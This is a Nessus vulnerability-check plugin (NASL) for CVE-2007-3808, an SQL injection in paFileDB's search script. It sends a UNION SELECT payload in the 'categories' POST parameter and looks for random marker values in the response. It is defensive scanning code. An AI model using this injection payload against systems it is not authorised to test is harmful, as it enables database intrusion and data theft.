#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");

if (description)
{
  script_id(25708);
  script_version("$Revision: 1.19 $");

  script_cve_id("CVE-2007-3808");
  script_bugtraq_id(24914);
  script_osvdb_id(36247);
  script_xref(name:"EDB-ID", value:"4186");

  script_name(english:"paFileDB includes/search.php categories Parameter SQL Injection");
  script_summary(english:"Tries to control search results");

 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP script that is prone to SQL
injection attack." );
 script_set_attribute(attribute:"description", value:
"The version of paFileDB installed on the remote host fails to sanitize
user-supplied input to the 'categories' parameter before using it in
the 'includes/search.php' script to make database queries.  An
unauthenticated attacker can exploit this issue to manipulate database
queries, which could lead to disclosure of sensitive information,
modification of data, or attacks against the underlying database." );
 script_set_attribute(attribute:"solution", value:
"Unknown at this time." );
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:POC/RL:U/RC:ND");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
 script_set_attribute(attribute:"plugin_publication_date", value: "2007/07/16");
 script_set_attribute(attribute:"vuln_publication_date", value: "2007/07/14");
 script_cvs_date("$Date: 2016/05/20 14:21:44 $");
script_set_attribute(attribute:"plugin_type", value:"remote");
script_set_attribute(attribute:"cpe", value:"cpe:/a:php_arena:pafiledb");
script_end_attributes();


  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2007-2016 Tenable Network Security, Inc.");

  script_dependencies("pafiledb_detect.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);
  script_require_keys("www/pafiledb");
  exit(0);
}

include("global_settings.inc");
include("misc_func.inc");
include("http.inc");


port = get_http_port(default:80);
if (!can_host_php(port:port)) exit(0);


# Test an install.
install = get_kb_item(string("www/", port, "/pafiledb"));

if (isnull(install)) exit(0);
matches = eregmatch(string:install, pattern:"^(.+) under (/.*)$");
if (!isnull(matches))
{
  dir = matches[2];

  magic1 = unixtime();
  magic2 = rand();
  exploit = string("1) UNION SELECT ALL null,", magic1, ",", magic2, crap(data:",null", length:85), " --");
  postdata = string(
    "query=", SCRIPT_NAME, "&",
    "search_in[]=file_name&",
    "search_in[]=file_desc&",
    "search_in[]=file_longdesc&",
    "search_in[]=file_creator&",
    "search_in[]=file_version&",
    "categories[]=", exploit
  );
  r = http_send_recv3(method: "POST", port: port, version: 11, 
    item: dir + "/index.php?act=search&process", data: postdata,
    add_headers: make_array("Content-Type", "application/x-www-form-urlencoded"));
  if (isnull(r)) exit(0);
  res = r[2];

  # There's a problem if we see our magic in the right places in the search results.
  if (
    string("Search Results For: ", SCRIPT_NAME) >< res &&
    string('act=view&amp;id=">', magic1, "</") >< res &&
    string('class="small">', magic2, "</") >< res
  )
  {
    security_hole(port);
    set_kb_item(name: 'www/'+port+'/SQLInjection', value: TRUE);
    exit(0);
  }
}
